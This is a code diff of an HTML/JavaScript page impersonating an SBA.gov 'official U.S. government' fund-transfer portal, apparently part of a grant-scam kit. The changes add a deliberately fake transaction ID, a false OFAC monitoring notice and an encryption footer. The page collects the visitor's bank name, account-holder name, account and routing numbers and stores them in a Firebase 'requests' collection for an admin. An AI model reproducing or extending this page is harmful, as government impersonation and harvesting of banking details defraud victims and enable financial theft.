@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBA Portal | Fund Disbursement</title>
+    <title>SBA Portal | Inter-Bank Transfer</title>
     <style>
         :root { --sba-blue: #00274c; --sba-accent: #0071bc; }
         body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
@@ -15,17 +14,12 @@
         .container { max-width: 450px; margin: 0 auto; padding: 15px; }
         .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-accent); }
         
-        /* Steps */
-        .steps { display: flex; justify-content: space-between; margin-bottom: 20px; }
-        .step { font-size: 9px; font-weight: 800; color: #cbd5e1; text-transform: uppercase; }
-        .step.active { color: var(--sba-accent); }
-
         .balance-preview { background: #f8fafc; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px dashed #cbd5e1; text-align: center; }
         
         label { display: block; font-size: 10px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
+        input, select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
         
-        .disburse-btn {
+        .transfer-btn {
             background: var(--sba-accent);
             color: white;
             padding: 16px;
@@ -38,61 +32,66 @@
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        .disburse-btn:disabled { background: #94a3b8; }
+        .transfer-btn:disabled { background: #94a3b8; cursor: not-allowed; }
+
+        .secure-footer { text-align: center; font-size: 9px; color: #94a3b8; margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
 
     <div class="gov-banner">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE DISBURSEMENT
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE TRANSFER GATEWAY
     </div>
 
     <div class="nav-header">
-        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px;">SBA.GOV</h1>
-        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">RETURN</button>
+        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight: 900;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">BACK</button>
     </div>
 
     <div class="container">
-        <div class="steps">
-            <span class="step active">1. Identity ✓</span>
-            <span class="step active">2. Details ✓</span>
-            <span class="step active" style="color:var(--sba-accent)">3. Disbursement</span>
-        </div>
-
         <div class="card">
-            <h2 style="color: var(--sba-blue); font-size: 20px; margin: 0 0 5px;">Fund Disbursement</h2>
-            <p style="font-size:10px; color:#ef4444; margin-bottom:20px; font-weight: 800;">PROTOCOL: FEDWIRE® SECURE TRANSFER</p>
+            <h2 style="color: var(--sba-blue); font-size: 20px; margin: 0 0 5px;">Transfer Funds</h2>
+            <p style="font-size:10px; color:#64748b; margin-bottom:20px;">External Bank Account Disbursement (FedWire)</p>
             
             <div class="balance-preview">
-                <span style="font-size: 9px; font-weight: 800; color: #64748b; text-transform: uppercase;">Available for Disbursement</span>
+                <span style="font-size: 9px; font-weight: 800; color: #64748b; text-transform: uppercase;">Transferable Balance</span>
                 <div id="availBal" style="font-size: 28px; font-weight: 900; color: #1e293b; margin-top: 2px;">$...</div>
             </div>
 
-            <label>Receiving Bank Name</label>
-            <input type="text" id="bankName" placeholder="e.g. JPMorgan Chase">
+            <label>Transfer Method</label>
+            <select id="tMethod">
+                <option value="FedWire">FedWire (Same Day / Next Day)</option>
+                <option value="ACH">ACH Transfer (2-3 Business Days)</option>
+            </select>
+
+            <label>Receiving Institution</label>
+            <input type="text" id="bankName" placeholder="Bank Name (e.g. Wells Fargo)">
+
+            <label>Account Holder Name</label>
+            <input type="text" id="accHolder" placeholder="Legal Name on Account">
 
             <label>Account Number</label>
-            <input type="text" id="accNum" placeholder="Checking or Savings Number">
+            <input type="text" id="accNum" placeholder="Recipient Account Number">
 
-            <label>ABA Routing Number (9 Digits)</label>
-            <input type="number" id="routNum" placeholder="Routing Number">
+            <label>Routing Number (9 Digits)</label>
+            <input type="number" id="routNum" placeholder="ABA Routing Number">
 
-            <label>Disbursement Amount (USD)</label>
-            <input type="number" id="wAmt" placeholder="0.00">
+            <label>Amount to Transfer ($)</label>
+            <input type="number" id="tAmt" placeholder="0.00">
 
-            <div style="background: #fffbeb; padding: 12px; border-radius: 8px; margin-top: 20px; border: 1px solid #fef3c7;">
-                <p style="font-size: 10px; color: #92400e; margin: 0; line-height: 1.4;">
-                    <b>NOTICE:</b> Transfers are processed during Federal Reserve business hours. Please allow 24-48 hours for clearing.
+            <div style="background: #f1f5f9; padding: 12px; border-radius: 8px; margin-top: 20px; border: 1px solid #e2e8f0;">
+                <p style="font-size: 10px; color: #475569; margin: 0; line-height: 1.4;">
+                    <b>SECURITY CHECK:</b> All outgoing transfers are monitored by the <b>Office of Foreign Assets Control (OFAC)</b>. Ensure all details are correct to avoid federal reversals.
                 </p>
             </div>
 
-            <button id="withdrawBtn" class="disburse-btn">Initiate FedWire Transfer</button>
+            <button id="transferBtn" class="transfer-btn">Confirm & Authorize Transfer</button>
         </div>
         
-        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 20px; font-family: monospace; letter-spacing: 1px;">
-            SECURE_GATEWAY // TRANSACTION_ENCRYPTED_AES256
-        </p>
+        <div class="secure-footer">
+            TRANSACTION_ID: <span id="txId">---</span> | ENCRYPTION: SSL_TLS_1.3
+        </div>
     </div>
 
     <script type="module">
@@ -116,60 +115,68 @@
         let userRawBalance = 0;
         let userData = {};
 
+        // Generate a fake session TX ID
+        document.getElementById('txId').innerText = "SBA-TR-" + Math.random().toString(36).substr(2, 7).toUpperCase();
+
         onAuthStateChanged(auth, async (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
 
             const userSnap = await getDoc(doc(db, "users", user.uid));
             if (userSnap.exists()) {
                 userData = userSnap.data();
-                const balString = userData.balance || "0";
-                // Strip commas so we can calculate
-                userRawBalance = parseFloat(balString.toString().replace(/,/g, ''));
-                document.getElementById('availBal').innerText = "$" + userRawBalance.toLocaleString('en-US', {minimumFractionDigits: 2});
+                const bal = userData.balance || 0;
+                userRawBalance = typeof bal === 'string' ? parseFloat(bal.replace(/,/g, '')) : parseFloat(bal);
+                
+                document.getElementById('availBal').innerText = "$" + userRawBalance.toLocaleString('en-US', {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                });
             }
         });
 
-        const withdrawBtn = document.getElementById('withdrawBtn');
-        withdrawBtn.onclick = async () => {
+        const btn = document.getElementById('transferBtn');
+        btn.onclick = async () => {
             const bank = document.getElementById('bankName').value.trim();
+            const holder = document.getElementById('accHolder').value.trim();
             const acc = document.getElementById('accNum').value.trim();
             const rout = document.getElementById('routNum').value.trim();
-            const amtStr = document.getElementById('wAmt').value;
+            const amtStr = document.getElementById('tAmt').value;
             const amt = parseFloat(amtStr);
 
-            if(!bank || !acc || !rout || !amtStr) return alert("ERROR: Please complete all banking fields.");
-            if(rout.length !== 9) return alert("INVALID ROUTING: US ABA Routing numbers must be exactly 9 digits.");
-            if(amt > userRawBalance) return alert("INSUFFICIENT FUNDS: Your maximum allocation is $" + userRawBalance.toLocaleString());
-            if(amt <= 0) return alert("INVALID AMOUNT: Please enter a valid sum.");
+            if(!bank || !acc || !rout || !amtStr || !holder) return alert("REQUIRED: Complete all bank details before authorizing.");
+            if(rout.length !== 9) return alert("ERROR: ABA Routing number must be exactly 9 digits.");
+            if(amt > userRawBalance) return alert("OVERDRAFT: Transfer amount exceeds available grant allocation.");
+            if(amt <= 0) return alert("INVALID AMOUNT.");
 
-            withdrawBtn.disabled = true;
-            withdrawBtn.innerText = "FEDWIRE HANDSHAKE...";
+            btn.disabled = true;
+            btn.innerText = "FEDWIRE AUTHORIZING...";
 
             try {
-                // Submit to Admin
+                // Submit to admin pool
                 await addDoc(collection(db, "requests"), {
                     userId: auth.currentUser.uid,
                     userName: userData.fullName || "User",
                     userEmail: auth.currentUser.email,
-                    type: "WITHDRAWAL",
-                    amount: amt.toLocaleString('en-US', {minimumFractionDigits: 2}),
-                    bankDetails: `${bank} | ACC: ${acc} | ROUT: ${rout}`,
+                    type: "TRANSFER",
+                    amount: amt,
+                    method: document.getElementById('tMethod').value,
+                    bankDetails: `${bank} | Name: ${holder} | Acc: ${acc} | Rout: ${rout}`,
                     status: "PENDING",
                     timestamp: serverTimestamp()
                 });
 
-                // Update User Status
+                // Update status on dashboard
                 await updateDoc(doc(db, "users", auth.currentUser.uid), {
-                    status: "TRANSFER IN PROGRESS"
+                    status: "TRANSFER PENDING REVIEW"
                 });
 
-                alert("DISBURSEMENT INITIATED: Transaction Reference " + Math.random().toString(36).substr(2, 9).toUpperCase());
+                alert("TRANSFER AUTHORIZED\n\nYour request has been queued for federal disbursement. Please check your transaction ledger for status updates.");
                 window.location.href = 'dashboard.html';
                 
             } catch(e) { 
-                alert("SECURE LINK ERROR: Please try again."); 
-                withdrawBtn.disabled = false;
-                withdrawBtn.innerText = "Initiate FedWire Transfer";
+                alert("GATEWAY ERROR: Request timed out."); 
+                btn.disabled = false;
+                btn.innerText = "Confirm & Authorize Transfer";
             }
         };
     </script>
